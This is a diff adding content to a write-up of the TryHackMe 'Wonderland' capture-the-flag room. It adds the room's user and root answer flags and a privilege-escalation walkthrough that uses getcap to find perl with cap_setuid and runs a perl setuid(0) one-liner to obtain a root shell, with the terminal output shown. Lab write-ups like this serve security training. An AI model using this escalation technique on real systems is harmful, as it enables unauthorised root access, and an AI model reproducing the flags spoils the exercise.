@@ -5,10 +5,12 @@
 
 Ques 1. Obtain the flag in user.txt
 ```bash
+thm{"Curiouser and curiouser!"}
 ```
 
 Ques 2. Escalate your privileges, what is the flag in root.txt?
 ```bash
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
 ```
 
 
@@ -787,5 +789,37 @@ find / -user root -perm /4000 2>/dev/null
 ### I dont get any usefull files
 ## Let try again
 ```bash
+getcap -r / 2>/dev/null
 ```
+# I got perl Capabilities here with suid 
+```bash
+alice@wonderland:~$ getcap -r / 2>/dev/null 
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+# 8. Let Get Root 
+### Let search on gtfobin for perl Capabilities
+![Screenshot from 2024-04-06 01-43-55](https://github.com/Esther7171/Wonderland/assets/122229257/cfe08d6f-8449-4d22-9aa6-5a2602edfffb)
 
+### So let run this 
+## I just modify last line of sh to bash ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
+```bash
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+```bash
+hatter@wonderland:~$ whoami
+hatter
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+root@wonderland:~# 
+```
+## Boom !! 
+```bash
+root@wonderland:~# ls
+linpeas.sh.save  password.txt
+root@wonderland:~# cd /home/alice/
+root@wonderland:/home/alice# cat root.txt 
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+root@wonderland:/home/alice# 
+```
+# 😄
